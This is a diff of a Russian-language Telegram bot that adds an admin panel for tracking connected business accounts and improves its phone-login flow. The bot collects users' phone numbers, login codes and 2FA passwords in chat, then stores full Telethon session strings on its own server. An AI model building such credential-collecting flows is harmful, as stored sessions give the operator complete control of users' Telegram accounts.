@@ -22,7 +22,8 @@ from aiohttp import web
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
-    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError
+    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, 
+    PhoneCodeInvalidError, PhoneNumberInvalidError
 )
 
 # Logging
@@ -131,6 +132,7 @@ def init_db():
                 cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
                 cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
                 cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
+                cur.execute("CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
                 conn.commit()
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                 for row in cur.fetchall(): link_chats.add(int(row[0]))
@@ -154,6 +156,38 @@ def init_db():
                 if row: CHANNEL_LINK = row[0]
     except Exception as e:
         logging.error(f"❌ Ошибка БД: {e}")
+
+def save_business_account(user_id: int, username: str, first_name: str):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s, %s, %s) "
+                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
+                    (user_id, username, first_name)
+                )
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка сохранения бизнес-аккаунта: {e}")
+
+def get_business_accounts():
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
+                return cur.fetchall()
+    except Exception as e:
+        logging.error(f"Ошибка получения бизнес-аккаунтов: {e}")
+        return []
+
+def delete_business_account(user_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM business_accounts WHERE user_id = %s", (user_id,))
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка удаления бизнес-аккаунта: {e}")
 
 def save_session(user_id: int, session_str: str):
     try:
@@ -455,6 +489,7 @@ def is_calculator_expression(text: str) -> bool:
 async def handle_bc(bc):
     bc_owners[bc.id] = int(bc.user.id)
     save_user_info(bc.user.id, bc.user.username, bc.user.first_name)
+    save_business_account(bc.user.id, bc.user.username, bc.user.first_name)
     owner_id = int(bc.user.id)
     owner_mention = get_user_mention(owner_id, bc.user.first_name)
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -484,8 +519,37 @@ def get_admin_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
         [InlineKeyboardButton(text="💼 Бизнес-аккаунты", callback_data="admin_users")],
+        [InlineKeyboardButton(text="🗑 Управление чатами", callback_data="admin_chats")],
         [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
     ])
+
+def get_chats_keyboard(page: int = 0):
+    accounts = get_business_accounts()
+    keyboard = []
+    start_idx = page * 10
+    end_idx = min(start_idx + 10, len(accounts))
+    
+    for i in range(start_idx, end_idx):
+        user_id, username, first_name, connected_at = accounts[i]
+        name = first_name or username or f"ID:{user_id}"
+        display_name = f"{name[:20]}..." if len(name) > 20 else name
+        keyboard.append([
+            InlineKeyboardButton(
+                text=f"👤 {display_name}",
+                callback_data=f"chat_user_{user_id}"
+            )
+        ])
+    
+    nav_buttons = []
+    if page > 0:
+        nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"chats_page_{page-1}"))
+    if end_idx < len(accounts):
+        nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"chats_page_{page+1}"))
+    if nav_buttons:
+        keyboard.append(nav_buttons)
+    
+    keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
+    return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 # ---- START ----
 @dp.message(Command("start"))
@@ -527,7 +591,6 @@ async def group_info(callback: CallbackQuery):
 # ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
 @dp.callback_query(F.data == "btn_connect_account")
 async def start_auth_process(callback: CallbackQuery, state: FSMContext):
-    # Проверяем, не идет ли уже авторизация
     current_state = await state.get_state()
     if current_state in (AuthState.waiting_for_phone.state, AuthState.waiting_for_code.state, AuthState.waiting_for_2fa.state):
         await callback.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.", show_alert=True)
@@ -546,21 +609,43 @@ async def start_auth_process(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(AuthState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
-    phone = message.contact.phone_number if message.contact else message.text.strip()
-    phone = re.sub(r'[^\d+]', '', phone)
-    if not phone.startswith('+'): phone = '+' + phone
-
     msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
-
+    
     try:
+        # Получаем номер телефона
+        if message.contact:
+            phone = message.contact.phone_number
+        else:
+            phone = message.text.strip()
+            # Очищаем номер от лишних символов
+            phone = re.sub(r'[^\d+]', '', phone)
+            # Если номер начинается с 8, заменяем на +7
+            if phone.startswith('8') and len(phone) == 11:
+                phone = '+7' + phone[1:]
+            # Если номер не начинается с +, добавляем +
+            elif not phone.startswith('+'):
+                phone = '+' + phone
+        
+        logging.info(f"Обработка номера: {phone}")
+        
+        # Создаем клиент
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
+        
+        # Проверяем валидность номера
+        if len(phone) < 10:
+            raise ValueError("Некорректный номер телефона")
+        
         try:
             res = await asyncio.wait_for(client.send_code_request(phone), timeout=15.0)
         except asyncio.TimeoutError:
             await client.disconnect()
             await msg.edit_text("⏱️ Превышено время ожидания от Telegram. Попробуйте снова.")
             await state.clear()
+            return
+        except PhoneNumberInvalidError:
+            await client.disconnect()
+            await msg.edit_text("❌ Некорректный номер телефона. Проверьте правильность ввода.")
             return
 
         await state.update_data(
@@ -573,14 +658,18 @@ async def process_phone(message: Message, state: FSMContext):
         await msg.edit_text(
             f"📱 <b>Код подтверждения отправлен!</b>\n\n"
             f"Номер: <code>{phone}</code>\n\n"
-            f"⚠️ <b>ВАЖНО:</b>\n"
-            f"Введите код, который пришел в Telegram",
+            f"Введите код, который пришел в Telegram:",
             parse_mode="HTML"
         )
         await state.set_state(AuthState.waiting_for_code)
+        
+    except PhoneNumberInvalidError:
+        await msg.edit_text("❌ Некорректный номер телефона. Проверьте правильность ввода.")
+    except ValueError as e:
+        await msg.edit_text(f"❌ {str(e)}")
     except Exception as e:
         logging.error(f"Ошибка при отправке кода: {e}")
-        await msg.edit_text(f"❌ Ошибка при отправке кода: {e}\nПопробуйте заново, нажав кнопку «Подключить аккаунт».")
+        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново, нажав кнопку «Подключить аккаунт».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text)
@@ -603,25 +692,33 @@ async def process_code(message: Message, state: FSMContext):
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         final_session = client.session.save()
         save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
         await client.disconnect()
 
-        await message.answer("✅ <b>Аккаунт успешно подключен!</b> Теперь юзербот активен во всех чатах, где вы его используете.\n\nЧтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.", parse_mode="HTML")
+        await message.answer(
+            "✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            "Теперь юзербот активен во всех чатах, где вы его используете.\n\n"
+            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.",
+            parse_mode="HTML"
+        )
         await state.clear()
+        
     except SessionPasswordNeededError:
         await client.disconnect()
         await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
         await state.set_state(AuthState.waiting_for_2fa)
+        
     except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
         await client.disconnect()
         await message.answer(
-            f"❌ Неверный или истекший код ({str(e)}).\nПопробуйте ещё раз. Если код не приходит, запросите новый через кнопку «Подключить аккаунт».",
+            f"❌ Неверный или истекший код.\nПопробуйте ещё раз.",
             parse_mode="HTML"
         )
-        # Не очищаем состояние, остаёмся в ожидании кода
+        
     except Exception as e:
         await client.disconnect()
         logging.error(f"Ошибка входа: {e}")
-        await message.answer(f"❌ Ошибка входа: {e}\nНачните заново через кнопку «Подключить аккаунт».")
+        await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_2fa, F.text)
@@ -637,15 +734,21 @@ async def process_2fa(message: Message, state: FSMContext):
         await client.sign_in(password=password)
         final_session = client.session.save()
         save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
         await client.disconnect()
 
-        await message.answer("✅ <b>Авторизация успешна!</b> Юзербот подключен.\n\nЧтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.", parse_mode="HTML")
+        await message.answer(
+            "✅ <b>Авторизация успешна!</b> Юзербот подключен.\n\n"
+            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.",
+            parse_mode="HTML"
+        )
         await state.clear()
+        
     except Exception as e:
         await client.disconnect()
-        await message.answer(f"❌ Неверный пароль или ошибка: {e}\nПопробуйте ввести пароль еще раз:")
+        await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте ввести пароль еще раз:")
 
-# ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ (ВЕСЬ ОРИГИНАЛ) ----
+# ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ ----
 @dp.message()
 @dp.business_message()
 async def handle(message: Message):
@@ -675,6 +778,7 @@ async def handle(message: Message):
                     conn_info = await bot.get_business_connection(bc_id)
                     bc_owners[bc_id] = int(conn_info.user.id)
                     save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
+                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                     owner_id = int(conn_info.user.id)
                 except: pass
             is_from_me = (uid == owner_id) if owner_id else False
@@ -739,9 +843,6 @@ async def handle(message: Message):
         if chat_id in reply_guard_chats and message.reply_to_message:
             await delete_msg(chat_id, message.message_id, bc_id)
             return
-
-        # ===== УДАЛЕНА ПРОВЕРКА ПОДПИСКИ НА КАНАЛ =====
-        # Больше не отправляем ссылку на канал и не требуем подписку
 
         if not text_raw: return
         low = text_raw.lower().strip()
@@ -976,6 +1077,7 @@ async def cmd_ban(message: Message):
         target_id = await resolve_user_id(arg)
         if target_id:
             set_user_ban(target_id, True)
+            delete_business_account(target_id)
             user_link = get_user_mention(target_id)
             await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
         else:
@@ -998,13 +1100,12 @@ async def cmd_unban(message: Message):
     except:
         await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")
 
-# ---- ОБРАБОТЧИКИ КНОПОК (админка) ----
+# ---- ОБРАБОТЧИКИ АДМИН-КНОПОК ----
 @dp.callback_query()
 async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data
     uid = callback.from_user.id
     
-    # Обработка кнопки проверки подписки (оставлена, но не используется)
     if data.startswith("check_sub:"):
         user_id = int(data.split(":")[1])
         if callback.from_user.id != user_id:
@@ -1023,6 +1124,7 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     if data == "btn_group_info":
         await callback.answer()
         return
+    
     if data == "btn_admin_panel":
         if uid != ADMIN_ID:
             await callback.answer()
@@ -1035,25 +1137,78 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
 
+    if data == "admin_panel_back":
+        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await callback.answer()
+        return
+
     if data == "admin_stats":
+        accounts = get_business_accounts()
         await callback.message.edit_text(
             f"📊 <b>СТАТИСТИКА:</b>\n\n"
-            f"• Бизнес-аккаунтов: <code>{len(set(bc_owners.values()))}</code>\n"
+            f"• Бизнес-аккаунтов: <code>{len(accounts)}</code>\n"
             f"• Юзеров в базе: <code>{len(user_names)}</code>\n"
             f"• Забанено: <code>{len(banned_users)}</code>",
             reply_markup=get_admin_keyboard(), parse_mode="HTML"
         )
+        
     elif data == "admin_users":
-        active_owners = {owner for owner in set(bc_owners.values()) if owner not in banned_users}
+        accounts = get_business_accounts()
         text = "💼 <b>ПОДКЛЮЧЕННЫЕ БИЗНЕС-АККАУНТЫ:</b>\n\n"
-        if not active_owners: 
+        if not accounts: 
             text += "Нет подключенных бизнес-аккаунтов."
         else:
-            for u_id in list(active_owners)[:35]:
-                fname = user_names.get(u_id, "Пользователь")
-                user_link = get_user_mention(u_id, fname)
-                text += f"• {user_link} (<code>{u_id}</code>)\n"
+            for user_id, username, first_name, connected_at in accounts[:20]:
+                name = first_name or username or f"ID:{user_id}"
+                user_link = get_user_mention(user_id, name)
+                time_str = connected_at.strftime("%d.%m.%Y %H:%M") if connected_at else "неизвестно"
+                text += f"• {user_link} — {time_str}\n"
         await callback.message.edit_text(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        
+    elif data == "admin_chats":
+        await callback.message.edit_text(
+            "🗑 <b>УПРАВЛЕНИЕ ЧАТАМИ</b>\n\n"
+            "Список пользователей, подключивших бота:",
+            reply_markup=get_chats_keyboard(0),
+            parse_mode="HTML"
+        )
+        
+    elif data.startswith("chats_page_"):
+        page = int(data.split("_")[2])
+        await callback.message.edit_text(
+            "🗑 <b>УПРАВЛЕНИЕ ЧАТАМИ</b>\n\n"
+            "Список пользователей, подключивших бота:",
+            reply_markup=get_chats_keyboard(page),
+            parse_mode="HTML"
+        )
+        
+    elif data.startswith("chat_user_"):
+        user_id = int(data.split("_")[2])
+        user_link = get_user_mention(user_id)
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❌ Удалить чат", callback_data=f"delete_chat_{user_id}")],
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_chats")]
+        ])
+        await callback.message.edit_text(
+            f"👤 <b>Информация о пользователе</b>\n\n"
+            f"ID: <code>{user_id}</code>\n"
+            f"Имя: {user_link}\n\n"
+            f"Выберите действие:",
+            reply_markup=kb,
+            parse_mode="HTML"
+        )
+        
+    elif data.startswith("delete_chat_"):
+        user_id = int(data.split("_")[2])
+        delete_business_account(user_id)
+        await callback.answer("✅ Чат удален из списка!", show_alert=True)
+        await callback.message.edit_text(
+            "🗑 <b>УПРАВЛЕНИЕ ЧАТАМИ</b>\n\n"
+            "Список пользователей, подключивших бота:",
+            reply_markup=get_chats_keyboard(0),
+            parse_mode="HTML"
+        )
+        
     elif data == "admin_ban_prompt":
         await callback.message.edit_text(
             "Команды бана/разбана:\n\n"
@@ -1061,6 +1216,7 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
             "• <code>/unban 123456789</code> или <code>/unban @username</code>",
             reply_markup=get_admin_keyboard(), parse_mode="HTML"
         )
+        
     await callback.answer()
 
 # ---- ВЕБ-СЕРВЕР ----
